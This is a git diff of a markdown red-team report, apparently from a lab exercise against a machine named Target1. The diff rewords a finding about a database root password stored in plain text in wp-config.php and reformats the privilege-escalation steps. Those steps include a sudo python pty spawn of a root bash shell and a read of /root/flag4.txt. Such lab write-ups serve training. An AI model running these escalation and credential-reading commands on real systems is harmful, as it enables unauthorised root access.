@@ -79,9 +79,10 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
 
 - **CWE-284** Server does not properly restrict access to a resource
 
-    Privilege escalation is preceded by this vulnerability. The root password to access the SQL database is reachable in plain text on the file wp-config.php
+    Privilege escalation is preceded by this vulnerability. The SQL's root password is reachable in plain text on the file wp-config.php
     
     Exploit:
+   
     ```
     Nano wp-config.php
     Look down mysql database password
@@ -128,12 +129,6 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
 
     2. Python Script
     
-        sudo python -c 'import pty;pty.spawn("/bin/bash")'
- 
-        ![9](/Resources/Images/2/17.png)
-    
-        cat /root/flag4.txt
-    
-        **Flag4**
-
-        ![10](/Resources/Images/2/19.png)
+        sudo python -c 'import pty;pty.spawn("/bin/bash")' | **Flag4**: cat /root/flag4.txt
+        ---|---
+        ![9](/Resources/Images/2/17.png) |   ![10](/Resources/Images/2/19.png)
